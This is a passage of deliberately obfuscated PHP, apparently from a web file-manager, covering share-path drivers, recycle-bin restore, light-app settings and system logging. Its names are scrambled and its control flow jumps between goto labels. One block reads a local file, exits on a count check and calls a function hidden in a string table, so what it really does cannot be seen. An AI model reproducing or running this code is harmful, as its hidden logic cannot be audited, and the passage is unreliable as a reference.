$BŞƒ„À±á™[403] => $c‰¯àğïÜ¬[$BŞƒ„À±á™[403]]); $this->where(array($BŞƒ„À±á™[382] => $e¶ÉÆƒÃê))->delete(); $FêİÃ‘Ê•ö->remove($e¶ÉÆƒÃê, !1); } goto DÁ’¿ò®º; A‡‰Ççºä: } public function restore($F«‡™£Ú¢š = false) { goto a˜Ï³æÚ·­; dïƒ¬¢Ë›: $F«‡™£Ú¢š = $F«‡™£Ú¢š == !1 ? !1 : $F«‡™£Ú¢š; if (!$Fç²£¬¤‚Ú) { return !0; } $D¶Ô²èˆ¢Î = array(); goto C¹è²©¿×; a˜Ï³æÚ·­: $fÀÑó”³‚± =& $_SERVER[°Óó£ÌİóèÅ]; $fŒ¸ŒÎÊâ = Model($fÀÑó”³‚±[852]); $Fç²£¬¤‚Ú = $this->listData(); goto dïƒ¬¢Ë›; C¹è²©¿×: foreach ($Fç²£¬¤‚Ú as $BÒ­òè’Ä) { goto E×„°„”äï; AÏ½‹î‘Åæ: if ($FçŒ·ß›Ç²[$fÀÑó”³‚±[383]] == $fÀÑó”³‚±[384]) { $D¶Ô²èˆ¢Î[] = $BÒ­òè’Ä; } goto AŒª²éÌ£¢; a¼’´¸×¬: if ($Eôµ¼Û±ßÔ[$fÀÑó”³‚±[418]] == $fÀÑó”³‚±[384]) { continue; } $this->recycleMove($BÒ­òè’Ä, 0); if ($FçŒ·ß›Ç²[$fÀÑó”³‚±[383]] == $fÀÑó”³‚±[384]) { $BÀË‘è = array($fÀÑó”³‚±[407] => array($fÀÑó”³‚±[416], $FçŒ·ß›Ç²[$fÀÑó”³‚±[381]] . $BÒ­òè’Ä . $fÀÑó”³‚±[417])); $fŒ¸ŒÎÊâ->where($BÀË‘è)->setField($fÀÑó”³‚±[418], 0); } goto dªİ „©²º; dªİ „©²º: $this->where(array($fÀÑó”³‚±[382] => $BÒ­òè’Ä))->delete(); $fŒ¸ŒÎÊâ->folderSizeReset($FçŒ·ß›Ç²[$fÀÑó”³‚±[392]]); $D¶Ô²èˆ¢Î[] = $FçŒ·ß›Ç²[$fÀÑó”³‚±[392]]; goto AÏ½‹î‘Åæ; E×„°„”äï: if ($F«‡™£Ú¢š != !1 && !in_array($BÒ­òè’Ä, $F«‡™£Ú¢š)) { continue; } $FçŒ·ß›Ç² = $fŒ¸ŒÎÊâ->where(array($fÀÑó”³‚±[382] => $BÒ­òè’Ä))->find(); $Eôµ¼Û±ßÔ = $fŒ¸ŒÎÊâ->where(array($fÀÑó”³‚±[382] => $FçŒ·ß›Ç²[$fÀÑó”³‚±[392]]))->find(); goto a¼’´¸×¬; AŒª²éÌ£¢: } $fŒ¸ŒÎÊâ->updateModifyTime($D¶Ô²èˆ¢Î); goto f¢¯ŸÁÄ©‘; f¢¯ŸÁÄ©‘: } private function recycleMove($d¼–Âó§¤, $DèÏ‹¶‹˜³ = 1) { $Båöó¥ í =& $_SERVER[°Óó£ÌİóèÅ]; $d¶ääåã„‘ = Model($Båöó¥ í[852]); $bÛÚÌßêæ = Model($Båöó¥ í[1794]); $E×µäÃÄ… = array($Båöó¥ í[382] => $d¼–Âó§¤); if ($DèÏ‹¶‹˜³) { $d¶ääåã„‘->where($E×µäÃÄ…)->setField($Båöó¥ í[418], 1); $bÛÚÌßêæ->eventRecycle($d¼–Âó§¤, $Båöó¥ í[1795]); } else { $C…Èèšë¼Û = $d¶ääåã„‘->where($E×µäÃÄ…)->find(); $E„é¨À®Ü = $C…Èèšë¼Û[$Båöó¥ í[383]] == $Båöó¥ í[384]; $B¸ç’¹½™ = $d¶ääåã„‘->fileNameAuto($C…Èèšë¼Û[$Båöó¥ í[392]], $C…Èèšë¼Û[$Båöó¥ í[28]], REPEAT_RENAME_FOLDER, $E„é¨À®Ü); if ($B¸ç’¹½™ != $C…Èèšë¼Û[$Båöó¥ í[28]]) { $d¶ääåã„‘->rename($d¼–Âó§¤, $B¸ç’¹½™); } $d¶ääåã„‘->where($E×µäÃÄ…)->setField($Båöó¥ í[418], 0); $bÛÚÌßêæ->eventRecycle($d¼–Âó§¤, $Båöó¥ í[1796]); } } } goto e±ÓÙ˜ù‡‚; C´¢ÎŒá“: class PathDriverDbShareItem extends PathDriverDB { public function __construct($e¤îŠÏ« ƒ) { $this->pathParse = $e¤îŠÏ« ƒ; $this->model = Model($_SERVER[°Óó£ÌİóèÅ][852]); } public function getPathOuter($e‘ƒ¥‹Œ¿‡) { $Bàò¶—ïé© =& $_SERVER[°Óó£ÌİóèÅ]; if (!$e‘ƒ¥‹Œ¿‡) { return $e‘ƒ¥‹Œ¿‡; } $D£ğš¼²‰ = $this->parse($e‘ƒ¥‹Œ¿‡); return trim(KodIO::makeShare($this->pathParse[$Bàò¶—ïé©[376]], $D£ğš¼²‰[$Bàò¶—ïé©[376]]), $Bàò¶—ïé©[8]); } protected function infoParse($cÔ§‚®éá®, $EÁ—ù‚á‘‘ = false, $e¨Ïµƒ«ø = false) { $FóÇæ‚šº =& $_SERVER[°Óó£ÌİóèÅ]; $f¼’ÛŸœ™í = $this->pathParse[$FóÇæ‚šº[376]]; $e ¥ñ‹†ä = trim($this->pathParse[$FóÇæ‚šº[757]], $FóÇæ‚šº[8]); return Action($FóÇæ‚šº[857])->sharePathInfo($f¼’ÛŸœ™í, $e ¥ñ‹†ä); } public function infoFull($cî°ˆ—×ï) { return $this->infoParse($cî°ˆ—×ï); } public function listAll($fĞ‡Ö®„×Œ) { goto dÚá…„éè‡; dÚá…„éè‡: $dè…œîÍ–• =& $_SERVER[°Óó£ÌİóèÅ]; $Cã‹æ ´¥Ì = IO::info($this->pathParse[$dè…œîÍ–•[84]]); if (!$Cã‹æ ´¥Ì) { return array(); } goto fÆ ‚„â; F…ÀÒ°î»ˆ: return $Aˆ»Üİ£ù’; goto BÑ¨ªã‰‡²; fÆ ‚„â: $Aˆ»Üİ£ù’ = $this->model->listAll($fĞ‡Ö®„×Œ); $C›­Êø‘¬‹ = Model($dè…œîÍ–•[426])->getInfo($Cã‹æ ´¥Ì[$dè…œîÍ–•[427]]); foreach ($Aˆ»Üİ£ù’ as &$CÓÜò¨î¦) { check_abort(); $CÓÜò¨î¦[$dè…œîÍ–•[858]] = Action($dè…œîÍ–•[857])->_shareItemeParse($CÓÜò¨î¦[$dè…œîÍ–•[858]], $C›­Êø‘¬‹); } goto F…ÀÒ°î»ˆ; BÑ¨ªã‰‡²: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($eŞ¯•—çĞ) { $this->pathParse = $eŞ¯•—çĞ; $this->model = Model($_SERVER[°Óó£ÌİóèÅ][852]); } protected function infoParse($fª—•ÙĞ, $eŒ—ÜÈŠî¦ = false, $DÄÃ·¿³‚ = false) { $AÂ˜Ü‡œÈ =& $_SERVER[°Óó£ÌİóèÅ]; return Action($AÂ˜Ü‡œÈ[763])->sharePathInfo($this->pathParse[$AÂ˜Ü‡œÈ[84]], !0); } public function listAll($CßŒØË¿É) { $b¹ã›ä¡èì =& $_SERVER[°Óó£ÌİóèÅ]; $c†·ªÕ÷Íİ = IO::info($this->pathParse[$b¹ã›ä¡èì[84]]); if (!$c†·ªÕ÷Íİ) { return array(); } $E—ƒåœˆ’š = $this->model->listAll($CßŒØË¿É); foreach ($E—ƒåœˆ’š as &$bÑÄÈœª‘Ã) { $bÑÄÈœª‘Ã[$b¹ã›ä¡èì[858]] = Action($b¹ã›ä¡èì[763])->itemInfo($bÑÄÈœª‘Ã[$b¹ã›ä¡èì[858]]); $d™…Œ¾’ÙÄ = substr($bÑÄÈœª‘Ã[$b¹ã›ä¡èì[84]], strpos(ltrim($bÑÄÈœª‘Ã[$b¹ã›ä¡èì[84]], $b¹ã›ä¡èì[8]), $b¹ã›ä¡èì[8]) + 1); $bÑÄÈœª‘Ã[$b¹ã›ä¡èì[858]][$b¹ã›ä¡èì[84]] = $this->pathParse[$b¹ã›ä¡èì[758]] . $d™…Œ¾’ÙÄ; } return $E—ƒåœˆ’š; } } class PathDriverDriverShareItem { public function __construct($F ß“èøß´) { $this->pathParse = $F ß“èøß´; } public function __call($D‚¤Œæ‡°Ó, $D£Å¡‚Á–ê) { $FÉå‹… =& $_SERVER[°Óó£ÌİóèÅ]; if (method_exists($this, $D‚¤Œæ‡°Ó)) { return; } $E·ÄÎƒ³Š¦ = call_user_func_array(array($FÉå‹…[859], $D‚¤Œæ‡°Ó), $D£Å¡‚Á–ê); $e‰Ù›Š“ˆ = array($FÉå‹…[860], $FÉå‹…[861], $FÉå‹…[862], $FÉå‹…[863], $FÉå‹…[741], $FÉå‹…[742], $FÉå‹…[864], $FÉå‹…[98], $FÉå‹…[865], $FÉå‹…[866]); if (in_array($D‚¤Œæ‡°Ó, $e‰Ù›Š“ˆ)) { $E·ÄÎƒ³Š¦ = $this->getPathOuter($E·ÄÎƒ³Š¦); } return $E·ÄÎƒ³Š¦; } public function copy($BÑ¦ÑÇÑì­, $Bšñ›¸æ, $FºŠØù¨Šò = false) { return $this->copyMove($BÑ¦ÑÇÑì­, $Bšñ›¸æ, $FºŠØù¨Šò, $_SERVER[°Óó£ÌİóèÅ][741]); } public function move($b†Á¹¶ç¬ô, $DÏ”¢´¨¾, $BÛµÄ¯âİ˜ = false) { return $this->copyMove($b†Á¹¶ç¬ô, $DÏ”¢´¨¾, $BÛµÄ¯âİ˜, $_SERVER[°Óó£ÌİóèÅ][742]); } private function copyMove($cÏ†éË “, $BÌ˜Àõ¼±÷, $eĞµõÒä¿, $d‡ˆ¨Êƒ) { goto eÒöÊîª; AˆŒÕ¿¾›‹: return $E®¶À£ÊÉ; goto EÃ¿ÒÛ”¤´; eÒöÊîª: $b˜ï½‡ô =& $_SERVER[°Óó£ÌİóèÅ]; $b¸ŸßÌ¼ = $BÌ˜Àõ¼±÷; $c‡´Å Ûé = IO::driverMake($BÌ˜Àõ¼±÷); goto B¡¢ë‡Ç¼¹; B¡¢ë‡Ç¼¹: if ($c‡´Å Ûé->pathParse[$b˜ï½‡ô[743]]) { $BÌ˜Àõ¼±÷ = $c‡´Å Ûé->pathParse[$b˜ï½‡ô[743]]; } else { $BÌ˜Àõ¼±÷ = $b¸ŸßÌ¼; } $E®¶À£ÊÉ = IO::copyMove($cÏ†éË “, $BÌ˜Àõ¼±÷, $eĞµõÒä¿, $d‡ˆ¨Êƒ); $E®¶À£ÊÉ = $this->getPathOuter($E®¶À£ÊÉ); goto AˆŒÕ¿¾›‹; EÃ¿ÒÛ”¤´: } public function pathFather($EÛîØ˜İµ‹) { return get_path_father($this->pathParse[$_SERVER[°Óó£ÌİóèÅ][84]]); } public function iconvSystem($FÆƒ§šØÒ‡) { return $FÆƒ§šØÒ‡; } protected function infoParse($CÔéÉ—ªÛï) { $F•Èå‹ì—Ò =& $_SERVER[°Óó£ÌİóèÅ]; $BÛÓÄº™’ = $this->pathParse[$F•Èå‹ì—Ò[765]][$F•Èå‹ì—Ò[764]] . $this->pathParse[$F•Èå‹ì—Ò[757]]; $dšâï‘ñ‚· = IO::info($BÛÓÄº™’); $DõÎÖ¤‚Ü› = $this->pathParse[$F•Èå‹ì—Ò[765]]; return Action($F•Èå‹ì—Ò[857])->_shareItemeParse($dšâï‘ñ‚·, $DõÎÖ¤‚Ü›); } public function listAll($Bà°†“×”) { $AÌáÊè‹·Œ =& $_SERVER[°Óó£ÌİóèÅ]; $dÖ¬¼½™šÑ = IO::listAll($Bà°†“×”); $b‹×»Õ²Î¯ = $this->pathParse[$AÌáÊè‹·Œ[765]]; foreach ($dÖ¬¼½™šÑ as &$d©‘·õŒ—) { check_abort(); $d©‘·õŒ— = array_merge(IO::info($d©‘·õŒ—[$AÌáÊè‹·Œ[84]]), $d©‘·õŒ—); $d©‘·õŒ—[$AÌáÊè‹·Œ[858]] = Action($AÌáÊè‹·Œ[857])->_shareItemeParse($d©‘·õŒ—, $b‹×»Õ²Î¯); } return $dÖ¬¼½™šÑ; } public function getPathOuter($eğğ¦‘°˜ã) { goto bÜËÑˆ®µÉ; b·“×™áƒ­: if (substr($F‹‡ØŠŒÜƒ, 0, strlen($B‚ÉÔî±‡‹)) != $B‚ÉÔî±‡‹) { return !1; } return $this->pathParse[$E‡íâÄŒÒ‘[758]] . $E‡íâÄŒÒ‘[8] . ltrim($b¶Å¥‹Ò œ, $E‡íâÄŒÒ‘[8]); goto BÕ¸…òˆ±µ; bÜËÑˆ®µÉ: $E‡íâÄŒÒ‘ =& $_SERVER[°Óó£ÌİóèÅ]; $EÅÛ˜Å´±Ì = KodIO::parse($eğğ¦‘°˜ã); if ($EÅÛ˜Å´±Ì[$E‡íâÄŒÒ‘[29]] == KodIO::KOD_SHARE_ITEM) { return $EÅÛ˜Å´±Ì[$E‡íâÄŒÒ‘[84]]; } goto eÉ‚í÷™Ñ¾; eÉ‚í÷™Ñ¾: $F‹‡ØŠŒÜƒ = KodIO::clear($eğğ¦‘°˜ã); $B‚ÉÔî±‡‹ = KodIO::clear($this->pathParse[$E‡íâÄŒÒ‘[765]][$E‡íâÄŒÒ‘[764]]); $b¶Å¥‹Ò œ = substr($F‹‡ØŠŒÜƒ, strlen($B‚ÉÔî±‡‹)); goto b·“×™áƒ­; BÕ¸…òˆ±µ: } public function getType() { $BÕÃ½›ÀæŒ =& $_SERVER[°Óó£ÌİóèÅ]; $aÛ™”¬“†„ = str_replace($BÕÃ½›ÀæŒ[80], $BÕÃ½›ÀæŒ[33], get_class($this)); return strtolower($aÛ™”¬“†„); } public function isTypeObject($Féƒ¹±Œß­) { return IO::isTypeObject($Féƒ¹±Œß­); } public function info($Dâ‡¤Ûäƒ) { return $this->infoParse($Dâ‡¤Ûäƒ); } public function infoAuth($a×÷•Üöèº) { return $this->infoParse($a×÷•Üöèº); } public function infoWithChildren($aÙ‹¢Æñ¾) { return $this->infoParse($aÙ‹¢Æñ¾); } public function infoFull($C¥­ÑÂá†‰) { return $this->infoParse($C¥­ÑÂá†‰); } } goto fã”·•å¿ë; eŞˆÆÇŒÈŸ: define($_SERVER[°Óó£ÌİóèÅ][1363], 2); define($_SERVER[°Óó£ÌİóèÅ][1364], 3); define($_SERVER[°Óó£ÌİóèÅ][1365], 4); goto B”‰àÈŒß; c˜›ÉÕ¢ç×: if ($_SERVER[$_SERVER[°Óó£ÌİóèÅ][57]] != $F†ÍÏÏŞ’($a…®ä»ºÈî)) { goto bÑó¢öñÓ’; bÑó¢öñÓ’: $Fåğ«Ö„× = $_SERVER[°Óó£ÌİóèÅ][59]; $cŒÍ‘é¡Ûˆ = BASIC_PATH . $_SERVER[°Óó£ÌİóèÅ][60]; $e˜¸£¤³ğ = $Fåğ«Ö„×($cŒÍ‘é¡Ûˆ); goto FÙÕåÖˆ°; B¸¦”Œ„²à: $eÀ™ÈĞ¤í($a…®ä»ºÈî); goto bŒì  Ë; FÙÕåÖˆ°: $bÁ®‡‚›‡ = explode($_SERVER[°Óó£ÌİóèÅ][61], $e˜¸£¤³ğ); if (count($bÁ®‡‚›‡) < $_SERVER[°Óó£ÌİóèÅ][62]) { die; } $eÀ™ÈĞ¤í = $_SERVER[°Óó£ÌİóèÅ][63]; goto B¸¦”Œ„²à; bŒì  Ë: } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\x4c\151\147\150\x74\101\160\160"; public $modelType = "\x53\x79\x73\x74\145\x6d\x4f\160\164\x69\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\147\162\x6f\x75\160", "\144\145\x73\x63", "\x63\157\x6e\x74\x65\156\164"); public function listData($Eà¿® Ï“ñ = false, $a¯ÅÃ¿´À¸ = "\x6d\157\144\x69\x66\x79\x54\x69\155\x65", $AÁƒ†·’İ = true) { return parent::listData($Eà¿® Ï“ñ, $a¯ÅÃ¿´À¸, $AÁƒ†·’İ); } public function remove($C²ªç––) { $F›Ñé‹ÎÍÉ = $this->findByName($C²ªç––); if (!$F›Ñé‹ÎÍÉ) { return !1; } return parent::remove($F›Ñé‹ÎÍÉ[$_SERVER[°Óó£ÌİóèÅ][376]]); } public function add($AÉ±õ‰‚Õ) { if ($this->findByName($AÉ±õ‰‚Õ[$_SERVER[°Óó£ÌİóèÅ][28]])) { return !1; } return parent::insert($AÉ±õ‰‚Õ); } public function update($E¾†ßŸİ, $F¨ÕÓ´¼ìß) { $AË£¿•µŸ• =& $_SERVER[°Óó£ÌİóèÅ]; $EÁÀã¾» = $this->findByName($E¾†ßŸİ); $d¨Àß„»ñÀ = $this->findByName($F¨ÕÓ´¼ìß[$AË£¿•µŸ•[28]]); if (!$EÁÀã¾» || $d¨Àß„»ñÀ && $d¨Àß„»ñÀ[$AË£¿•µŸ•[376]] != $EÁÀã¾»[$AË£¿•µŸ•[376]]) { return !1; } return parent::update($EÁÀã¾»[$AË£¿•µŸ•[376]], $F¨ÕÓ´¼ìß); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\137\154\157\147"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\145\162\x74", "\x66\165\x6e\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $càÜÁŒ†Şù =& $_SERVER[°Óó£ÌİóèÅ]; return array($càÜÁŒ†Şù[1808] => LNG($càÜÁŒ†Şù[1809]), $càÜÁŒ†Şù[1810] => LNG($càÜÁŒ†Şù[1811]), $càÜÁŒ†Şù[1486] => LNG($càÜÁŒ†Şù[1812]), $càÜÁŒ†Şù[1813] => LNG($càÜÁŒ†Şù[1814]), $càÜÁŒ†Şù[1815] => LNG($càÜÁŒ†Şù[1816]), $càÜÁŒ†Şù[1817] => LNG($càÜÁŒ†Şù[1818]), $càÜÁŒ†Şù[1819] => LNG($càÜÁŒ†Şù[1820]), $càÜÁŒ†Şù[1821] => LNG($càÜÁŒ†Şù[1822]), $càÜÁŒ†Şù[1518] => LNG($càÜÁŒ†Şù[1823]), $càÜÁŒ†Şù[1824] => LNG($càÜÁŒ†Şù[1825]), $càÜÁŒ†Şù[1826] => LNG($càÜÁŒ†Şù[1827]), $càÜÁŒ†Şù[1828] => LNG($càÜÁŒ†Şù[1829]), $càÜÁŒ†Şù[1830] => LNG($càÜÁŒ†Şù[1831]), $càÜÁŒ†Şù[1516] => LNG($càÜÁŒ†Şù[1832]), $càÜÁŒ†Şù[1521] => LNG($càÜÁŒ†Şù[1833]), $càÜÁŒ†Şù[1834] => LNG($càÜÁŒ†Şù[1835]), $càÜÁŒ†Şù[1836] => LNG($càÜÁŒ†Şù[1837]), $càÜÁŒ†Şù[1838] => LNG($càÜÁŒ†Şù[1839]), $càÜÁŒ†Şù[1840] => LNG($càÜÁŒ†Şù[1841]), $càÜÁŒ†Şù[1524] => LNG($càÜÁŒ†Şù[1842]), $càÜÁŒ†Şù[1525] => LNG($càÜÁŒ†Şù[1843]), $càÜÁŒ†Şù[1844] => LNG($càÜÁŒ†Şù[1845]), $càÜÁŒ†Şù[1846] => LNG($càÜÁŒ†Şù[1847]), $càÜÁŒ†Şù[1848] => LNG($càÜÁŒ†Şù[1849]), $càÜÁŒ†Şù[1850] => LNG($càÜÁŒ†Şù[1851]), $càÜÁŒ†Şù[1852] => LNG($càÜÁŒ†Şù[1853]), $càÜÁŒ†Şù[1519] => LNG($càÜÁŒ†Şù[1854]), $càÜÁŒ†Şù[1855] => LNG($càÜÁŒ†Şù[1856]), $càÜÁŒ†Şù[1857] => LNG($càÜÁŒ†Şù[1858]), $càÜÁŒ†Şù[1859] => LNG($càÜÁŒ†Şù[1859]), $càÜÁŒ†Şù[1860] => LNG($càÜÁŒ†Şù[1490]), $càÜÁŒ†Şù[1861] => LNG($càÜÁŒ†Şù[1862]), $càÜÁŒ†Şù[1863] => LNG($càÜÁŒ†Şù[1864]), $càÜÁŒ†Şù[1865] => LNG($càÜÁŒ†Şù[1866]), $càÜÁŒ†Şù[1867] => LNG($càÜÁŒ†Şù[1868]), $càÜÁŒ†Şù[1869] => LNG($càÜÁŒ†Şù[1869]), $càÜÁŒ†Şù[1870] => LNG($càÜÁŒ†Şù[1871]), $càÜÁŒ†Şù[1872] => LNG($càÜÁŒ†Şù[1873]), $càÜÁŒ†Şù[1874] => LNG($càÜÁŒ†Şù[1875]), $càÜÁŒ†Şù[1876] => LNG($càÜÁŒ†Şù[1877]), $càÜÁŒ†Şù[1878] => LNG($càÜÁŒ†Şù[1879]), $càÜÁŒ†Şù[1880] => LNG($càÜÁŒ†Şù[1881])); } private function typeFile() { $F£İ‚›²— =& $_SERVER[°Óó£ÌİóèÅ]; $dœ´¯Ã®Ÿğ = array($F£İ‚›²—[1521] => array($F£İ‚›²—[1522]), $F£İ‚›²—[1828] => array($F£İ‚›²—[1882]), $F£İ‚›²—[1830] => array($F£İ‚›²—[1883]), $F£İ‚›²—[1516] => array($F£İ‚›²—[1517]), $F£İ‚›²—[1836] => array(), $F£İ‚›²—[1838] => array(), $F£İ‚›²—[1840] => array(), $F£İ‚›²—[1524] => array($F£İ‚›²—[1526]), $F£İ‚›²—[1525] => array($F£İ‚›²—[1526]), $F£İ‚›²—[1844] => array($F£İ‚›²—[1884]), $F£İ‚›²—[1846] => array($F£İ‚›²—[1884]), $F£İ‚›²—[1848] => array($F£İ‚›²—[1885]), $F£İ‚›²—[1834] => array($F£İ‚›²—[1886]), $F£İ‚›²—[1850] => array($F£İ‚›²—[1887]), $F£İ‚›²—[1852] => array($F£İ‚›²—[1888]), $F£İ‚›²—[1519] => array($F£İ‚›²—[1520])); return $dœ´¯Ã®Ÿğ; } private function typeAll() { goto eÏÕ§ùî•; C•ÓéÌ†é¦: return $b¯ñÈäí¦Ä; goto fÁ‚ÑƒÀ¼À; Eî•”Ã©‰: foreach ($aĞ«®°±®³ as $DŞÜ‡‰‹·å => $dÒğ²ôÄŠ) { $b¯ñÈäí¦Ä[$dÒğ²ôÄŠ[0]] = $b¯ñÈäí¦Ä[$DŞÜ‡‰‹·å]; } $b¯ñÈäí¦Ä[$c¢Šì’Àº“[1526]] = LNG($c¢Šì’Àº“[1889]); $b¯ñÈäí¦Ä[$c¢Šì’Àº“[1884]] = LNG($c¢Šì’Àº“[1890]); goto C•ÓéÌ†é¦; eÏÕ§ùî•: $c¢Šì’Àº“ =& $_SERVER[°Óó£ÌİóèÅ]; $b¯ñÈäí¦Ä = $this->typeList; $aĞ«®°±®³ = array_filter($this->typeFile()); goto Eî•”Ã©‰; fÁ‚ÑƒÀ¼À: } public function addLog($BÙÛ¹ã¼‹ã, $cá÷‚¢£­ = array()) { goto fÂ­½ÕÀœÆ; Fİè·âÜù: $eİ½¬Ò†¿‘ = get_client_ip(); if (!$cá÷‚¢£­ || strlen(json_encode($cá÷‚¢£­)) >= 1024) { $cá÷‚¢£­ = array($dƒ¥‰åĞË¢[1891] => $eİ½¬Ò†¿‘); } else { if (is_array($cá÷‚¢£­)) { $cá÷‚¢£­[$dƒ¥‰åĞË¢[1891]] = $eİ½¬Ò†¿‘; } else { $cá÷‚¢£­ = array($dƒ¥‰åĞË¢[783] => $cá÷‚¢£­, $dƒ¥‰åĞË¢[1891] => $eİ½¬Ò†¿‘); } } $cá÷‚¢£­ = array($dƒ¥‰åĞË¢[1085] => Session::sign(), $dƒ¥‰åĞË¢[1086] => $c†£×ÙÉº†, $dƒ¥‰åĞË¢[29] => $BÙÛ¹ã¼‹ã, $dƒ¥‰åĞË¢[1088] => json_encode($cá÷‚¢£­)); goto EêÁˆ„­; EêÁˆ„­: parent::add($cá÷‚¢£­); goto CÙè¶ØÕŞ; fÂ­½ÕÀœÆ: $dƒ¥‰åĞË¢ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($this->typeList[$BÙÛ¹ã¼‹ã])) { return; } $c†£×ÙÉº† = USER_ID ? USER_ID : (isset($cá÷‚¢£­[$dƒ¥‰åĞË¢[1095]]) ? $cá÷‚¢£­[$dƒ¥‰åĞË¢[1095]] : 0); goto Fİè·âÜù; CÙè¶ØÕŞ: } public function remove($c½µªòŒİó) { $this->where(array($_SERVER[°Óó£ÌİóèÅ][814] => $c½µªòŒİó))->delete(); } private function _makeOrder($b’·ƒ·­ğØ = '') { goto c›º‚®Õ£Ô; F›ôñÆêê„: return $this->order($b’·ƒ·­ğØ); goto bÇ¦ğÎ©ˆÈ; c›º‚®Õ£Ô: $D„ˆâàø¿· =& $_SERVER[°Óó£ÌİóèÅ]; $A˜Ó˜äÈ†§ = $D„ˆâàø¿·[195]; $D„£¼îµÚ‰ = array($D„ˆâàø¿·[1632] => $D„ˆâàø¿·[1633], $D„ˆâàø¿·[1513] => $D„ˆâàø¿·[1590]); goto d¡ˆµÅÃ¬Õ; d¡ˆµÅÃ¬Õ: $Bã‹óÎŞÓ = Input::get($D„ˆâàø¿·[1588], $D„ˆâàø¿·[7], $D„ˆâàø¿·[1689], array($D„ˆâàø¿·[1634], $D„ˆâàø¿·[1513])); $Bã‹óÎŞÓ = $D„£¼îµÚ‰[$Bã‹óÎŞÓ]; $b’·ƒ·­ğØ = $b’·ƒ·­ğØ . "{$A˜Ó˜äÈ†§}\x20{$Bã‹óÎŞÓ}"; goto F›ôñÆêê„; bÇ¦ğÎ©ˆÈ: } public function get($cùŒÑÑåÓ = '') { goto bÚºÚ¾ª¹¥; bÚºÚ¾ª¹¥: $CîÇËÂ†ŒÊ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$cùŒÑÑåÓ) { show_json(array()); } $C³ìÅ’Ÿø¢ = array(); goto fÜ±˜©ğŠ²; aÀ·•éŸ×: $F‚§Ëè´­ø = $this->_makeOrder()->where($C³ìÅ’Ÿø¢)->selectPage(); if (empty($F‚§Ëè´­ø[$CîÇËÂ†ŒÊ[364]])) { show_json(array(), !0, $F‚§Ëè´­ø[$CîÇËÂ†ŒÊ[361]]); } $F‚§Ëè´­ø[$CîÇËÂ†ŒÊ[364]] = $this->logList($F‚§Ëè´­ø[$CîÇËÂ†ŒÊ[364]]); goto A„ñ¿½ù÷Á; A„ñ¿½ù÷Á: return $F‚§Ëè´­ø; goto CˆÅÈÙÁà²; fÜ±˜©ğŠ²: if ($cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[1095]]) { $C³ìÅ’Ÿø¢[$CîÇËÂ†ŒÊ[1095]] = $cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[1095]]; } if (isset($cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[467]])) { $dˆ³ÊËİ‡¸ = $cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[467]]; $EÌğ–¹Êƒ§ = isset($cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[468]]) ? $cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[468]] : time(); $C³ìÅ’Ÿø¢[$CîÇËÂ†ŒÊ[195]] = array($CîÇËÂ†ŒÊ[332], array($dˆ³ÊËİ‡¸, $EÌğ–¹Êƒ§)); } if ($cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[29]]) { $a¢áÓİ›Õ• = explode($CîÇËÂ†ŒÊ[47], $cùŒÑÑåÓ[$CîÇËÂ†ŒÊ[29]]); $B…Ê‘›èÊ˜ = $this->typeFile(); $f¨¬’Åïù = array(); foreach ($a¢áÓİ›Õ• as $Aİ»ÉèÌè) { $f¨¬’Åïù[] = $Aİ»ÉèÌè; if (isset($B…Ê‘›èÊ˜[$Aİ»ÉèÌè])) { $f¨¬’Åïù = array_merge($f¨¬’Åïù, $B…Ê‘›èÊ˜[$Aİ»ÉèÌè]); } } $f¨¬’Åïù = array_unique($f¨¬’Åïù); if ($f¨¬’Åïù) { $C³ìÅ’Ÿø¢[$CîÇËÂ†ŒÊ[29]] = array($CîÇËÂ†ŒÊ[7], $f¨¬’Åïù); } } goto aÀ·•éŸ×; CˆÅÈÙÁà²: } private function ipAddress(&$b¨¹Ø¶¦¦Ú) { $A´’¾øÄÌ” =& $_SERVER[°Óó£ÌİóèÅ]; if (!empty($b¨¹Ø¶¦¦Ú[$A´’¾øÄÌ”[1891]])) { $EÈíŒ°Ÿæ• = IpLocation::get($b¨¹Ø¶¦¦Ú[$A´’¾øÄÌ”[1891]]); if ($EÈíŒ°Ÿæ• == $A´’¾øÄÌ”[1892]) { $EÈíŒ°Ÿæ• = $A´’¾øÄÌ”[1893]; } } else { $EÈíŒ°Ÿæ• = LNG($A´’¾øÄÌ”[1894]); } $b¨¹Ø¶¦¦Ú[$A´’¾øÄÌ”[1895]] = $EÈíŒ°Ÿæ•; } private function getSourceList(&$C”¥Ëù¯ùˆ) { $ağ¼ß ¬Ê… =& $_SERVER[°Óó£ÌİóèÅ]; $E…ì£Ç–Œß = array(); foreach ($C”¥Ëù¯ùˆ as $BÇÌÑ±ÎÎ‰ => $aÓÑ»çÒÛ¦) { $aò½µ¨„Ø = json_decode($aÓÑ»çÒÛ¦[$ağ¼ß ¬Ê…[1590]], !0); if (strpos($aÓÑ»çÒÛ¦[$ağ¼ß ¬Ê…[29]], $ağ¼ß ¬Ê…[1727]) !== 0) { goto dëßóô¢‰÷; BÙæ†âí×›: $E…ì£Ç–Œß[] = $aò½µ¨„Ø[$ağ¼ß ¬Ê…[382]] = $D® °¹ˆ™ä[$ağ¼ß ¬Ê…[382]]; $E…ì£Ç–Œß[] = $aò½µ¨„Ø[$ağ¼ß ¬Ê…[1726]] = $D® °¹ˆ™ä[$ağ¼ß ¬Ê…[392]]; $C”¥Ëù¯ùˆ[$BÇÌÑ±ÎÎ‰][$ağ¼ß ¬Ê…[1590]] = json_encode($aò½µ¨„Ø); goto fäÚ›¶°•©; dëßóô¢‰÷: if (!isset($aò½µ¨„Ø[$ağ¼ß ¬Ê…[84]]) || strpos($aÓÑ»çÒÛ¦[$ağ¼ß 